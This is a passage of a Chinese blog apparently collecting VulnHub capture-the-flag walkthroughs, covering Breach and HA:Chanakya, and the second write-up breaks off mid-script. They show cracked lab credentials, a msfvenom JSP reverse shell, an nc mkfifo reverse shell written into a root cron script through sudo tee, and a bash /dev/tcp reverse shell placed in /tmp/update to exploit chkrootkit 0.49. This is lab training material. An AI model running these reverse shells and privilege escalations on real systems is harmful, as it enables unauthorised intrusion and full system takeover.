class="line-numbers-rows"><span></span></span></code></pre></li><li><p>解密之后：<code>cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</code>好像还是base64</p></li><li><p>再解密：<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p></li><li><p>键值对？会不会是密码，发现主页的图片的超链接里面有个可以输入密码的</p></li><li><p>还真是密码</p></li><li><p>登录进去之后发现有三封未读的邮件</p></li><li><p>第一封:</p><blockquote><p>主题: <strong>Posting sensitive content</strong> (发布敏感内容)</p><p>内容: Peter, yeahhh, I’m going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that’d be great. -Bill</p><p>彼得，是的，我得去问你，让你的团队只在管理门户上发布任何敏感的工件。我的密码非常安全。如果你能把一切都告诉他们那就太好了。-比尔</p></blockquote></li><li><p>第二封:</p><blockquote><p>主题:IDS&#x2F;IPS system</p><p>内容:Hey Peter,</p><p>I got a really good deal on an IDS&#x2F;IPS system from a vendor I met at that happy hour at Chotchkie’s last week!  -Michael</p><p>嗨，彼得，上周在Chotchkie的欢乐时光里，我遇到一个供应商，他给我提供了一个非常好的ID&#x2F;IPS系统！  -迈克尔</p></blockquote></li><li><p>第三封</p><blockquote><p>  主题:FWD: Thank you for your purchase of Super Secret Cert Pro!</p><p>  ​         (FWD:感谢您购买超级机密证书专业版！)</p><p>  内容:Peter, I am not sure what this is. I saved the file here: 192.168.110.140&#x2F;.keystore Bob ——————————————————————————————————————————————- From: <a href="mailto:&#114;&#101;&#103;&#105;&#115;&#x74;&#114;&#x61;&#x72;&#64;&#x70;&#101;&#110;&#101;&#116;&#114;&#x6f;&#x64;&#x65;&#x2e;&#99;&#111;&#109;">&#114;&#101;&#103;&#105;&#115;&#x74;&#114;&#x61;&#x72;&#64;&#x70;&#101;&#110;&#101;&#116;&#114;&#x6f;&#x64;&#x65;&#x2e;&#99;&#111;&#109;</a> Sent: 02 June 2016 16:16 To: <a href="mailto:&#98;&#111;&#x62;&#x40;&#105;&#110;&#105;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#x6d;">&#98;&#111;&#x62;&#x40;&#105;&#110;&#105;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a>; <a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#x62;&#114;&#101;&#97;&#99;&#104;&#46;&#108;&#111;&#99;&#97;&#x6c;">&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#x62;&#114;&#101;&#97;&#99;&#104;&#46;&#108;&#111;&#99;&#97;&#x6c;</a> Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!</p><p>  彼得，我不知道这是什么。我将文件保存在此处：192.168.110.140&#x2F;.keystore Bob———————————–发件人：<a href="mailto:&#x72;&#x65;&#x67;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#112;&#x65;&#110;&#x65;&#x74;&#x72;&#x6f;&#100;&#x65;&#x2e;&#x63;&#x6f;&#x6d;">&#x72;&#x65;&#x67;&#x69;&#115;&#x74;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#112;&#x65;&#110;&#x65;&#x74;&#x72;&#x6f;&#100;&#x65;&#x2e;&#x63;&#x6f;&#x6d;</a>发送时间：2016年6月2日16:16收件人：<a href="mailto:&#66;&#x6f;&#x62;&#64;&#x69;&#x6e;&#x69;&#x74;&#101;&#x63;&#x68;&#46;&#x63;&#111;&#x6d;">&#66;&#x6f;&#x62;&#64;&#x69;&#x6e;&#x69;&#x74;&#101;&#x63;&#x68;&#46;&#x63;&#111;&#x6d;</a>；<a href="mailto:&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x62;&#x72;&#x65;&#x61;&#107;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;">&#97;&#x64;&#109;&#105;&#x6e;&#64;&#x62;&#x72;&#x65;&#x61;&#107;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#108;</a> Subject:感谢您购买超级机密证书专业版！请查找附加的新SSL证书。不要和任何人分享！</p></blockquote></li><li><p>发现有一个证书保存在：<code>http://192.168.110.140/.keystore</code></p></li><li><p>keystore需要解析：<code>keytool -list -v -keystore keystore</code></p></li><li><p>但是需要密码…这密码是啥呢？</p></li><li><p>最后在<code>http://192.168.110.140/impresscms/modules/profile/index.php?uid=2</code>页面中找到一个</p></li><li><p><code>SSL implementation test capture</code>的超链接&gt;&gt;&gt;打开发现有一封邮件</p><blockquote><p>  Published by <a href="http://192.168.110.140/impresscms/modules/content/index.php?uid=2">Peter Gibbons</a> on 2016&#x2F;6&#x2F;4 21:37:05. (0 reads)</p><p>  Team - I have uploaded a pcap file of our red team’s re-production of the  attack. I am not sure what trickery they were using but I cannot read  the file. I tried every nmap switch from my C|EH studies and just cannot figure it out. <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> They told me the alias, storepassword and keypassword are all set to ‘tomcat’. Is that useful?? Does anyone know what this is? I guess we are securely encrypted now? -Peter p.s. I’m going fishing for the next 2 days and will not have access to email or phone.</p><p>  由[Peter Gibbons]出版（<a href="http://192.168.110.140/imprescms/modules/content/index.php?uid=2%EF%BC%892016%E5%B9%B46%E6%9C%884%E6%97%A521:37:05%E3%80%82%EF%BC%880%E8%AF%BB%EF%BC%89">http://192.168.110.140/imprescms/modules/content/index.php?uid=2）2016年6月4日21:37:05。（0读）</a></p><p>  团队-我上传了一个关于红队重新制造攻击的pcap文件。我不知道他们在耍什么花招，但我看不懂文件。我试过从我的C | EH研究中的每一个nmap开关，但就是想不出来。<a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap</a> 他们告诉我别名、存储密码和密钥密码都设置为“tomcat”。那有用吗？？有人知道这是什么吗？我想我们现在已经加密了？-彼得</p><p>  p.s.我将在接下来的两天里去钓鱼，我将无法使用电子邮件或电话。</p></blockquote></li><li><p>里面说存储密码和密钥密码都设置为“tomcat”而且是用于<a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E7%9A%84%E7%A7%98%E9%92%A5%E8%AF%81%E4%B9%A6">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap的秘钥证书</a></p></li><li><p>找打了密码那就解开来看看</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">keytool <span class="token parameter variable">-list</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-keystore</span> keystore<span class="token comment">#结果:</span>密钥库类型: JKS密钥库提供方: SUN您的密钥库包含 <span class="token number">1</span> 个条目别名: tomcat创建日期: <span class="token number">2016</span>-5-21条目类型: PrivateKeyEntry证书链长度: <span class="token number">1</span>证书<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>:所有者: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">OU</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">O</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">L</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">ST</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">C</span><span class="token operator">=</span>Unknown发布者: <span class="token assign-left variable">CN</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">OU</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">O</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">L</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">ST</span><span class="token operator">=</span>Unknown, <span class="token assign-left variable">C</span><span class="token operator">=</span>Unknown序列号: 60856e88有效期开始日期: Sat May <span class="token number">21</span> 01:51:07 CST <span class="token number">2016</span>, 截止日期: Fri Aug <span class="token number">19</span> 01:51:07 CST <span class="token number">2016</span>证书指纹:         MD5: C4:72:E6:B0:5F:58:CE:8B:B4:7E:2D:67:86:A9:52:A0         SHA1: D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53         SHA256: F0:4A:E8:7F:52:C1:78:B4:14:2B:4D:D9:1A:34:31:F7:19:0A:29:F6:0C:85:00:0B:58:3A:37:20:6C:7E:E6:31         签名算法名称: SHA256withRSA         版本: <span class="token number">3</span>扩展:<span class="token comment">#1: ObjectId: 2.5.29.14 Criticality=false</span>SubjectKeyIdentifier <span class="token punctuation">[</span>KeyIdentifier <span class="token punctuation">[</span>0000: <span class="token number">47</span> 6B A3 <span class="token number">37</span> ED A5 1F 0A   0D <span class="token number">61</span> CA AA <span class="token number">17</span> 9C F4 8C  Gk.7<span class="token punctuation">..</span><span class="token punctuation">..</span>.a<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>0010: <span class="token number">10</span> <span class="token number">64</span> <span class="token number">87</span> DF                                        .d<span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>用Wireshark打开SSL_test_phase1.pcap看了一下，发现都是加密的</p></li><li><p>那我们要导出证书</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#命令:</span>keytool <span class="token parameter variable">-importkeystore</span> <span class="token parameter variable">-srckeystore</span> <span class="token operator">&lt;</span>keystore路径<span class="token operator">></span> <span class="token parameter variable">-destkeystore</span> <span class="token operator">&lt;</span>证书保存的位置<span class="token punctuation">\</span>.p1<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token parameter variable">-deststoretype</span> PKCS12 <span class="token parameter variable">-srcalias</span> tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>导出之后再将导出的证书导入Wireshark</p></li><li><p>开始分析他们的攻击流量</p></li><li><p>找到路径:<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p></li><li><p>接着去分析流量去</p></li><li><p>找到这样的一行<code>username=&quot;tomcat&quot; password=&quot;s3cret&quot;</code></p></li><li><p>去试试。。。</p></li><li><p>密码不对进不去</p></li><li><p>然后又在找</p></li><li><p>最后在一个请求头里面找到<code>Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</code></p></li><li><p>base64编码，去解开<code>tomcat:Tt\5D8F(#!*u=G)4m7zB</code>这个好像是密码</p></li><li><p>进去之后找到一个上传war包的地方</p></li><li><p>使用kali生成一个shell:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.110.120 <span class="token parameter variable">-o</span> /tmp/s.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>得到一个tomcat的shell</p></li><li><p>想办法提权</p></li><li><p>到网站目录下找到两个MD5命名的php文件</p></li><li><p>查看到两个都是数据库连接文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Database Username// Your database user account on the <span class="token function">host</span>define<span class="token punctuation">(</span> <span class="token string">'SDATA_DB_USER'</span>, <span class="token string">'root'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>// Database Password// Password <span class="token keyword">for</span> your database user accountdefine<span class="token punctuation">(</span> <span class="token string">'SDATA_DB_PASS'</span>, <span class="token string">''</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>查看数据库的账号密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">select</span> user,password from user<span class="token punctuation">;</span>+------------------+-------------------------------------------+<span class="token operator">|</span> user             <span class="token operator">|</span> password                                  <span class="token operator">|</span>+------------------+-------------------------------------------+<span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span><span class="token operator">|</span> milton           <span class="token operator">|</span> 6450d89bd3aff1d893b85d3ad65d2ec2          <span class="token operator">|</span><span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span><span class="token operator">|</span> root             <span class="token operator">|</span>                                           <span class="token operator">|</span><span class="token operator">|</span> debian-sys-maint <span class="token operator">|</span> *A9523939F1B2F3E72A4306C34F225ACF09590878 <span class="token operator">|</span>+------------------+-------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>发现一个账户 <code>milton  ： 6450d89bd3aff1d893b85d3ad65d2ec2 </code></p></li><li><p>mysql都是MD5加密的碰撞之后得到：<code>thelaststraw</code></p></li><li><p>再看看怎么提权</p></li><li><p><code>cat /etc/passwd</code>看看用户信息</p></li><li><p>找到两个用户创建的用户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash<span class="token number">2</span>. blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>milton</code>这个用户和mysql的用户名一致那密码会不会也一样？</p></li><li><p>试试…</p></li><li><p>发现进去了提权到了milton普通用户</p></li><li><p>回到home目录下发现只有两个文件</p></li><li><p>一张图片，一个sh，sh里面写的是：<code>There&#39;s nothing here</code> (这里什么都没有)</p></li><li><p>这时候想想看图片隐写</p></li><li><p>用scp拿下来：<code>scp [-r &lt;dir&gt;] my_badge.jpg root@192.168.110.120:/tmp</code> </p></li><li><p>读取一下并没有什么东西，然后到网站目录下去看看，发现一个images文件夹</p></li><li><p>里面的图片都是以人名命名的，都是照片？下下来读取一下数据</p></li><li><p>最后在bill.png中找到一个键值对：<code>Comment：coffeestains</code>  Comment（解释）coffeestains（咖啡渍）</p></li><li><p>对图片的解释？可能是blumbergh的密码，都试试看</p></li><li><p>发现coffeestains就是blumbergh的密码，然后我们进blumbergh的账户</p></li><li><p>然后三部曲：<code>cd  history  crontab -l </code></p></li><li><p>查看home目录的内容：发现是空的</p></li><li><p>查看计划任务：发现啥也没有</p></li><li><p>查看history发现有两行特殊的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/cleanup<span class="token function">cat</span> tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>顺藤摸瓜&gt; 我们看到tidyup.sh的内容是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment">#Hacker Evasion Script </span><span class="token comment">#Initech Cyber Consulting, LLC</span><span class="token comment">#彼得·吉本斯和迈克尔·博尔顿-2016</span><span class="token comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span><span class="token comment">#黑客规避脚本</span><span class="token comment">#Initech网络咨询有限责任公司</span><span class="token comment">#此脚本设置为每3分钟运行一次，作为对黑客的额外防御措施。</span><span class="token builtin class-name">cd</span> /var/lib/tomcat6/webapps <span class="token operator">&amp;&amp;</span> <span class="token function">find</span> swingline <span class="token parameter variable">-mindepth</span> <span class="token number">1</span> <span class="token parameter variable">-maxdepth</span> <span class="token number">10</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>竟然是一个黑客防御的脚本</p></li><li><p>然后发现是root用户的脚本而且还是3分钟执行一次</p></li><li><p>我们想办法把里面的语句变成shellcode</p></li><li><p>查看该用户可以执行root的什么命令 <code>sudo -l</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#User blumbergh may run the following commands on Breach:</span>    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>发现可以使用一个tee的文件百度一看，这是一个获得标准输入的命令</p></li><li><p>我们通过tee将shellcode写到tidyup.sh</p></li><li><p>先写一个shellcode</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"mkfifo /tmp/lcawx; nc 192.168.110.120 20096 0&lt;/tmp/lcawx | /bin/sh >/tmp/lcawx 2>&amp;1; rm /tmp/lcawx"</span> <span class="token operator">></span> /tmp/s<span class="token comment">#再执行</span><span class="token function">cat</span> /tmp/s <span class="token operator">|</span> <span class="token function">sudo</span> /usr/bin/tee /usr/share/cleanup/tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>kalii监听一个20096端口：<code>nc -lvp 20096</code></p></li><li><p>静静的等带3分钟的到来</p></li><li><p>然后就反弹了一个shell</p></li><li><p>我们再用python将提升到标准shell</p><pre class="line-numbers language-none"><code class="language-none">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><ul><li>就拿到了 rootshell</li></ul><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. 网站账号密码：pgibbons <span class="token builtin class-name">:</span> damnitfeel<span class="token variable">$goodtobeagang</span><span class="token variable">$ta</span><span class="token number">2</span>. 红客攻击流量包地址：http://192.168.110.140/impresscms/_SSL_test_phase1.pcap<span class="token number">3</span>. keystore密钥地址：http://192.168.110.140/.keystore<span class="token number">4</span>. tomcat后台地址：https://192.168.110.140:8443/_M@nag3Me/html<span class="token number">5</span>. tomcat后台账号密码：tomcat <span class="token builtin class-name">:</span> Tt<span class="token punctuation">\</span>5D8F<span class="token punctuation">(</span><span class="token comment">#!*u=G)4m7zB</span><span class="token number">6</span>. mysql账号密码： root <span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>null<span class="token operator">></span><span class="token number">7</span>. mysql另一个账号密码 ： milton <span class="token builtin class-name">:</span> thelaststraw（也是服务器milton用户的密码）<span class="token number">8</span>. 服务器用户密码：blumbergh <span class="token builtin class-name">:</span> coffeestains<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HA:Chanakya靶机渗透</title>
      <link href="/chanakya/"/>
      <url>/chanakya/</url>
      
        <content type="html"><![CDATA[<h1 id="HA-Chanakya靶机渗透"><a href="#HA-Chanakya靶机渗透" class="headerlink" title="HA:Chanakya靶机渗透"></a>HA:Chanakya靶机渗透</h1><h2 id="1-环境和信息"><a href="#1-环境和信息" class="headerlink" title="1. 环境和信息"></a>1. 环境和信息</h2><h3 id="1-1-靶机下载地址"><a href="#1-1-靶机下载地址" class="headerlink" title="1.1 靶机下载地址"></a>1.1 靶机下载地址</h3><ul><li><a href="https://download.vulnhub.com/ha/chanakya.zip">点击下载[chanakya.zip]</a></li></ul><h3 id="1-2-环境"><a href="#1-2-环境" class="headerlink" title="1.2 环境"></a>1.2 环境</h3><ul><li>攻击环境：<em><strong>kali linux</strong></em>  IP地址：<em><strong>192.168.0.21</strong></em></li><li>靶机环境：<em><strong>linux</strong></em> IP地址：<em><strong>待扫描</strong></em></li></ul><h3 id="1-3-信息"><a href="#1-3-信息" class="headerlink" title="1.3 信息"></a>1.3 信息</h3><blockquote><p>摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！是时候面对Chanakya。<br>您是否能够解决此“从根开始”并证明自己更明智？<br>枚举是关键！！！！</p></blockquote><h2 id="2-渗透过程"><a href="#2-渗透过程" class="headerlink" title="2. 渗透过程"></a>2. 渗透过程</h2><h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><ul><li>脚本化扫描 【只是简单的将 IP发现、端口扫描、nikto扫描、whatweb 生成一个报表】<br><img src="/../static/chanakya/image-20200519213259360.png" alt="image-20200519213259360"></li><li>扫描结束，我们可以获得靶机IP地址为： <em><strong>192.168.0.107</strong></em></li><li>扫描结果在 <em>Auto-Scan&#x2F;192.168.0.107.html</em></li><li>打开看看：<br><img src="/../static/chanakya/image-20200519213632003.png" alt="image-20200519213632003"></li><li>可以看到开启的服务有 <strong>(21)ftp  (22)ssh 和80(http)</strong></li><li>nikto扫描的web并没有可用的信息，whatweb也没扫描出任何web框架</li><li>简单浏览一下网页<br><img src="/../static/chanakya/image-20200519214049252.png" alt="image-20200519214049252"></li><li>也没看到啥玩意啊</li><li>开始尝试目录爆破<br><img src="/../static/chanakya/image-20200519215514033.png" alt="image-20200519215514033"></li><li>得到关键文件：<em><strong>abuse.txt</strong></em></li><li>打开内容是：<em><strong>nfubxn.cpncat</strong></em>  不管先保存一下</li></ul><h3 id="2-2-开始渗透"><a href="#2-2-开始渗透" class="headerlink" title="2.2 开始渗透"></a>2.2 开始渗透</h3><ul><li><p>我们先尝试登陆ftp看看<br><img src="/../static/chanakya/image-20200519215923243.png" alt="image-20200519215923243"></p></li><li><p>需要用户名密码，试试这个<em><strong>nfubxn.cpncat</strong></em></p></li><li><p>登不上去，难道是加密了，还是另藏玄机</p></li><li><p>如果是加密很可能是凯撒密码，就是每个字母都会偏移某个特定的值</p></li><li><p>但是  像 “ <strong>.</strong> “ 这种字符是不会被加密的而且只支持26个字母</p></li><li><p>到网上解密一下<br><img src="/../static/chanakya/image-20200519221021938.png" alt="image-20200519221021938"></p></li><li><p>可以用脚本把 1-25 的全部结果都拿出来看看</p></li><li><p>我这里直接公布答案了<br><img src="/../static/chanakya/image-20200519221229352.png" alt="image-20200519221229352"></p></li><li><p>当key&#x3D;13时，密文就变成了<em><strong>ashoka.pcapng</strong></em>  </p></li><li><p>用过<em>Wireshark</em> 的都知道 <em>pcapng</em>是新版本数据包的后缀名，刚好有点在前面，这就好像是一个文件</p></li><li><p>我们试着访问 <a href="http://192.168.0.107/ashoka.pcapng">http://192.168.0.107/ashoka.pcapng</a></p></li><li><p>能下载~看来是要我们分析流量</p></li><li><p>可以看到有FTP协议的流量，我们追踪流<br><img src="/../static/chanakya/image-20200519221857035.png" alt="image-20200519221857035"></p></li><li><p>可以看到登录时输入的账号和密码还有一些操作</p></li><li><p>FTP账号密码：<em><strong>ashoka : kautilya</strong></em><br><img src="/../static/chanakya/image-20200519222454291.png" alt="image-20200519222454291"></p></li><li><p>登录之后是在<strong>ashoka</strong>的用户目录下， 也没看到什么有价值的文件</p></li><li><p>反正他有ssh服务，我们尝试使用公钥达到免密码登录</p></li><li><p>先到kaii机器生成自己的密钥对<br><img src="/../static/chanakya/image-20200519222912589.png" alt="image-20200519222912589"></p></li><li><p>在*~&#x2F;.ssh* 文件夹里面的 <em>.pub</em>文件 复制成一份名叫 <em><strong>authorized_keys</strong></em>的文件</p></li><li><p>随便用什么连接一下FTP然后把这个文件传到FTP下的***.ssh&#x2F;authorized_keys***</p></li><li><p>就可以免密码登录了<br><img src="/../static/chanakya/image-20200519224818556.png" alt="image-20200519224818556"></p></li><li><p>登录之后就可以想办法提权了</p></li><li><p>我们直接找suid的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token number">777</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment"># 查找777的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../static/chanakya/image-20200519225239807.png" alt="image-20200519225239807"></p></li><li><p>没有找到可利用的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span> Linux ubuntu <span class="token number">4.15</span>.0-20-generic <span class="token comment">#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><span class="token function">cat</span> /etc/*release <span class="token assign-left variable">DISTRIB_ID</span><span class="token operator">=</span>Ubuntu<span class="token assign-left variable">DISTRIB_RELEASE</span><span class="token operator">=</span><span class="token number">18.04</span><span class="token assign-left variable">DISTRIB_CODENAME</span><span class="token operator">=</span>bionic<span class="token assign-left variable">DISTRIB_DESCRIPTION</span><span class="token operator">=</span><span class="token string">"Ubuntu 18.04 LTS"</span><span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu"</span><span class="token assign-left variable">VERSION</span><span class="token operator">=</span><span class="token string">"18.04 LTS (Bionic Beaver)"</span><span class="token assign-left variable">ID</span><span class="token operator">=</span>ubuntu<span class="token assign-left variable">ID_LIKE</span><span class="token operator">=</span>debian<span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu 18.04 LTS"</span><span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token string">"18.04"</span><span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"https://www.ubuntu.com/"</span><span class="token assign-left variable">SUPPORT_URL</span><span class="token operator">=</span><span class="token string">"https://help.ubuntu.com/"</span><span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"https://bugs.launchpad.net/ubuntu/"</span><span class="token assign-left variable">PRIVACY_POLICY_URL</span><span class="token operator">=</span><span class="token string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span><span class="token assign-left variable">VERSION_CODENAME</span><span class="token operator">=</span>bionic<span class="token assign-left variable">UBUNTU_CODENAME</span><span class="token operator">=</span>bionic<span class="token function">history</span>  <span class="token comment">#无</span><span class="token function">crontab</span> <span class="token parameter variable">-l</span>  <span class="token comment">#无</span><span class="token function">sudo</span> <span class="token parameter variable">-l</span> <span class="token comment">#没密码</span><span class="token function">ls</span> <span class="token parameter variable">-al</span> /tmp <span class="token comment">#找到一个logs文件</span>logs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>打开看了一下，随便找了一条百度了一下</p></li><li><p>说是 <em>linux系统入侵检测工具chkrootkit</em> 的日志文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> chkrootkit  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment">#查找chkrootkit文件的位置</span>/usr/local/share/chkrootkit/usr/local/share/chkrootkit/chkrootkit<span class="token builtin class-name">cd</span> /usr/local/share/chkrootkit  <span class="token comment">#切换进chkrootkit目录</span>./chkrootkit <span class="token parameter variable">--help</span> <span class="token comment">#说是-V查看版本</span>./chkrootkit <span class="token parameter variable">-V</span>chkrootkit version <span class="token number">0.49</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>kali 里面再搜下<em><strong>chkrootkit</strong></em>的漏洞<br><img src="/../static/chanakya/image-20200519230813298.png" alt="image-20200519230813298"></p></li><li><p>刚好版本相同</p></li><li><p>这里用的是<em><strong>33899.txt</strong></em></p><blockquote><p>The line ‘file_port&#x3D;$file_port $i’ will execute all files specified in<br>$SLAPPER_FILES as the user chkrootkit is running (usually root), if<br>$file_port is empty, because of missing quotation marks around the<br>variable assignment.</p><p>Steps to reproduce:</p><ul><li>Put an executable file named ‘update’ with non-root owner in &#x2F;tmp (not<br>mounted noexec, obviously)</li><li>Run chkrootkit (as uid 0)</li></ul><p>Result: The file &#x2F;tmp&#x2F;update will be executed as root, thus effectively<br>rooting your box, if malicious content is placed inside the file.</p><p>If an attacker knows you are periodically running chkrootkit (like in<br>cron.daily) and has write access to &#x2F;tmp (not mounted noexec), he may<br>easily take advantage of this.</p><p>Suggested fix: Put quotation marks around the assignment.</p><p>file_port&#x3D;”$file_port $i”</p><p>I will also try to contact upstream, although the latest version of<br>chkrootkit dates back to 2009 - will have to see, if I reach a dev there</p></blockquote></li><li><p>大概意思就是说<em><strong>chkrootkit</strong></em> 一般会设置成计划运行,在运行时会调用***&#x2F;tmp&#x2F;update***文件</p></li><li><p>然后我就写了一个反弹shell的文件,保存在***&#x2F;tmp&#x2F;update***</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.0.21/8888 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" 